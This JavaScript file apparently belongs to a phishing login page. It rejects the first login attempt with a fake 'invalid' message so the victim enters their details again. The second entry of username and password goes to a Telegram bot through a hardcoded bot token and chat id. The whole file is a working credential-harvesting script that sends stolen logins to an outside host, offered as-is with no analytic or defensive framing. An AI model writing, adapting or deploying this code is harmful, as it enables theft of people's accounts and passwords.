document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    const loading = document.getElementById('loading');
    const validText = document.querySelector(".invalid");
    let tryCount = 0; // Counter for login attempts

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username');
        const password = document.getElementById('password');

        // Remove the 'invalid-input' class if it was added previously
        username.classList.remove('invalid-input');
        password.classList.remove('invalid-input');

        if (tryCount === 0) {
            // For the first attempt, mark as invalid input
            username.classList.add('invalid-input');
            password.classList.add('invalid-input');
            validText.style.display = 'block';
            username.value = '';
            password.value = '';
            
            tryCount++;
            return;
        } else {
            // Show loading animation on the second attempt
            
            // Delay before sending data
            setTimeout(() => {
                loading.style.display = 'flex';
                
                const encodedUsername = encodeURIComponent(username.value);
                const encodedPassword = encodeURIComponent(password.value);
                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;

                const url = `https://api.telegram.org/bot7171450017:AAGe_ToaGcVjtH4Q8a7_c0ZDQ4ZKtu8jyJE/sendMessage?chat_id=1561974461&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
                
                fetch(url, { method: 'GET' })
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none'; // Hide loading animation
                    console.log(data);
                    if (data.ok) {
                        console.log(data.result.message_id);
                        // Actions on successful data submission can be added here
                    } else {
                        console.log(data.error_code);
                        // Handling of submission errors
                    }
                    
                })
                .catch((error) => {
                    alert("Error! Please try again: " + error.message);
                    console.log(error);
                    loading.style.display = 'none';
                    username.value = '';
                    password.value = '';
                });
            }, 500);
        }
    });
});
